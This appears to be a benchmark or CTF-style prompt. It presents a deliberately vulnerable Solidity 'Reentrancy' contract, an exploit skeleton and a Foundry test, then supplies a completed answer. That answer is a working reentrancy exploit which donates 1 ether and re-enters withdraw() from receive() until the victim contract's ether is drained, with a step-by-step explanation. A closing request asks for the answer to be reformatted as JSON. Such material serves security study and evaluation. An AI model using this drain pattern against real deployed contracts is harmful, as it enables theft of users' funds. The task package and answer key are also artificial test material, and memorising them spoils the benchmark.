You are an expert smart contract auditor. Your task is to identify vulnerabilities in the following smart contract and write an exploit targeting these weaknesses. Focus specifically on common Solidity issues such as reentrancy, unchecked external calls, integer overflow/underflow, and authorization flaws. Here is the contract to analyze:

```// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrancy {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}```.

Once you've identified a vulnerability, complete the exploit contract to exploit this weakness. Here is the contract skeleton for your exploit: 

```
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "../../src/Reentrancy/Reentrancy.sol";

contract ReentrancyExploit {
    Reentrancy victim;

    constructor(address _victim) public {
        victim = Reentrancy(payable(_victim));
    }

    function hack() public {
       // your code here
    }

    receive() external payable {
    }
}
```.

To validate your exploit, it must pass all assertions in the following test case:

```// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "../src/Reentrancy/Reentrancy.sol";
import "../exploits/Reentrancy/ReentrancyExploitAttempt.sol";
import "forge-std/console.sol";
import "forge-std/test.sol";


contract TestReentrancyExploit is Test {

    function testHack() public {
        
        // deploy contracts
        Reentrancy victim = new Reentrancy();
        ReentrancyExploit attacker = new ReentrancyExploit(address(victim));
        
        vm.deal(address(victim), 1 ether);
        vm.deal(address(attacker), 1 ether);

        attacker.hack();

        assertTrue(address(victim).balance == 0);
        assertTrue(address(attacker).balance > 1 ether);    
    }
}```.

Please note that you are working within a gas limit, so prioritize an efficient and optimized exploit structure. You may add new functions or contracts as needed to accomplish this.

**Output format**: Provide only a JSON object in the following format:

{"my_attempt": "<your full exploit code>", "my_explanation": "<your explanation>"}

Please ensure:
- No additional text outside the JSON.
- JSON format is strictly adhered to, including escaping quotes and backslashes where necessary.
- Response is in plain text without code block formatting.

Your task is to help me format some data. Given this data:

```{"my_attempt": "// SPDX-License-Identifier: Unlicense\npragma solidity ^0.6.12;\npragma experimental ABIEncoderV2;\n\nimport '../../src/Reentrancy/Reentrancy.sol';\n\ncontract ReentrancyExploit {\n    Reentrancy victim;\n\n    constructor(address _victim) public {\n        victim = Reentrancy(payable(_victim));\n    }\n\n    function hack() public payable {\n        // Deposit 1 ether to create an initial balance\n        victim.donate{value: 1 ether}(address(this));\n        // Start the attack by calling withdraw\n        victim.withdraw(1 ether);\n    }\n\n    receive() external payable {\n        // Reenter withdraw while the victim has balance\n        if(address(victim).balance >= 1 ether) {\n            victim.withdraw(1 ether);\n        } else if(address(victim).balance > 0) {\n            victim.withdraw(address(victim).balance);\n        }\n    }\n}", "my_explanation": "My exploit targets the reentrancy vulnerability in the Reentrancy contract. In the `withdraw` function, the external call to `msg.sender.call{value:\_amount}('')` is made before updating `balances[msg.sender] -= \_amount;`. This allows an attacker to reenter the `withdraw` function multiple times, draining more funds than their balance should allow.\n\nIn my exploit, the `hack()` function first calls `donate()` to deposit 1 ether to the victim contract, creating an initial balance in `balances[msg.sender]`. It then calls `withdraw(1 ether)`, initiating the withdrawal process.\n\nDuring the external call to `msg.sender.call{value:\_amount}('')`, the `receive()` function of the exploit contract is triggered. In `receive()`, I check if the victim contract still has sufficient balance, and then reenter `withdraw(1 ether)` again. Since `balances[msg.sender]` has not yet been decreased, the victim contract believes the balance is still sufficient, and allows the withdrawal.\n\nThis process continues recursively, reentering `withdraw(1 ether)` repeatedly until the victim contract's balance is drained. Each time, the victim contract sends 1 ether to the exploit contract, thinking the balance is sufficient.\n\nAfter the attack, the victim's balance is zero, and the attacker ends up with more than 1 ether (their initial balance plus the victim's ether), passing the assertions in the test case."}```.

Please format it into the structured output model I provided you and then return it to me.
